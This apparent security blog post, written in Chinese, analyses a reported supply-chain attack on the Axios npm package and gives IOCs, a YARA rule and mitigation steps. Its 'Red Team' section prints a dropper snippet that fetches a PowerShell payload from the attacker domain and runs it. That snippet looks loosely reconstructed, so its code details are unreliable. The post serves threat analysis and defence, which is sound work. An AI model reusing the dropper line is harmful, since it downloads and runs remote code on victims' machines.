---
layout: post
title:  "North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack"
date:   2026-04-01 07:13:45 +0000
categories: [security]
severity: critical
---

# 🚨 解析 North Korea-Nexus 威脅演員對 Axios NPM 套件的供應鏈攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: 遠程命令執行 (RCE)
> * **關鍵技術**: 供應鏈攻擊、JavaScript Obfuscation、XOR 和 Base64 編碼

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Axios NPM 套件的維護者帳戶被攻擊者入侵，導致 `plain-crypto-js` 套件被添加為 Axios 的依賴項。這個 `plain-crypto-js` 套件包含了一個 obfuscated dropper，會下載和執行 WAVESHAPER.V2 後門程式。
* **攻擊流程圖解**:
  1. 攻擊者入侵 Axios 維護者帳戶。
  2. 攻擊者添加 `plain-crypto-js` 套件為 Axios 的依賴項。
  3. 使用者安裝或更新 Axios 套件。
  4. NPM 自動執行 `setup.js` 腳本。
  5. `setup.js` 腳本下載和執行 WAVESHAPER.V2 後門程式。
* **受影響元件**: Axios NPM 套件版本 1.14.1 和 0.30.4。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要入侵 Axios 維護者帳戶。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // setup.js
    const K = __filename;
    const t = require('fs');
    const os = require('os');
    const execSync = require('exec-sync');
    
    // ... (obfuscated code)
    
    // 下載和執行 WAVESHAPER.V2 後門程式
    execSync(`curl -s -X POST -d packages.npm.org/product1 http://sfrclak[.]com:8000/6202033 > ${K}.ps1 & ${K}.ps1`);
    
    ```
* **繞過技術**: 攻擊者使用 obfuscation 和 encoding 技術來隱藏 payload 的真實性質。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09 |
| IP | 142.11.206.73 |
| Domain | sfrclak[.]com |
| File Path | %PROGRAMDATA%\wt.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule G_Backdoor_WAVESHAPER_V2_PS_1 {
      meta:
        description = "Detects the WAVESHAPER.V2 PowerShell backdoor"
        author = "GTIG"
      strings:
        $ss1 = "packages.npm.org/product1" ascii wide nocase
        $ss2 = "Extension.SubRoutine" ascii wide nocase
      condition:
        uint16(0) != 0x5A4D and filesize < 100KB and 2 of ($ss*)
    }
    
    ```
* **緩解措施**:
 1. 更新 Axios 套件至安全版本。
 2. 刪除 `plain-crypto-js` 套件。
 3. 執行完整的系統掃描以檢測和移除任何惡意程式碼。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **供應鏈攻擊 (Supply Chain Attack)**: 一種攻擊方式，攻擊者入侵軟件的供應鏈，例如入侵開發者的帳戶或添加惡意程式碼到軟件中。
* **JavaScript Obfuscation**: 一種技術，使用各種方法來隱藏 JavaScript 程式碼的真實性質，例如使用 Base64 編碼或 XOR。
* **XOR (Exclusive OR)**: 一種邏輯運算，兩個位元的 XOR 運算結果為 1，如果兩個位元不同，否則為 0。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


